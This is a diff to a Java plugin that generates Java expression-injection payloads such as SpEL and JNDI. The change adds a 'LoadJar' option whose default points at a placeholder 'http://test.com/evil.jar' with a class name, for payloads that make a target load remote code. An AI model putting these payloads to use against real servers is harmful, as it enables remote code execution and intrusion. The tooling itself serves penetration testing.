@@ -22,7 +22,7 @@ public class JExprEncoderPlugin implements IHelperPlugin {
         this.pluginHelper = helperPluginCallbacks.getPluginHelper();
         helperPluginCallbacks.setHelperPluginAutor("whwlsfb");
         helperPluginCallbacks.setHelperPluginName("JExpr Encoder Utils");
-        helperPluginCallbacks.setHelperPluginVersion("0.2.1");
+        helperPluginCallbacks.setHelperPluginVersion("0.2.2");
         helperPluginCallbacks.setHelperPluginDescription("Java 表达式注入生成器");
         helperPluginCallbacks.registerHelper(new ArrayList<IHelper>() {{
             add(new JExprEncoder(new SpELExpr()));
@@ -93,6 +93,13 @@ public class JExprEncoderPlugin implements IHelperPlugin {
             args7.setRequired(true);
             args.add(args7);
 
+            IArg args8 = pluginHelper.createArg();
+            args8.setName("loadJar_params");
+            args8.setDefaultValue("http://test.com/evil.jar|EvilClassName");
+            args8.setDescription("LoadJar配置");
+            args8.setRequired(true);
+            args.add(args8);
+
             IArg args6 = pluginHelper.createArg();
             args6.setName("encoder");
             args6.setType(IArg.ARG_TYPE_ENUM);
@@ -147,6 +154,17 @@ public class JExprEncoderPlugin implements IHelperPlugin {
                 String[] results = _expr.genJNDI(settings.getString("jndi_address"));
                 output.successPrintln("JNDI：");
                 printResult(results, output);
+            }
+
+            if (settings.getString("loadJar_params") != null) {
+                String[] params = settings.getString("loadJar_params").split("\\|");
+                if (params.length == 2) {
+                    String[] results = _expr.genLoadJar(params[0], params[1]);
+                    output.successPrintln("LoadJar：");
+                    printResult(results, output);
+                }else {
+                    output.warningPrintln("LoadJar配置信息异常。");
+                }
             }
 
             if (settings.getFileContent("class_file") != null) {
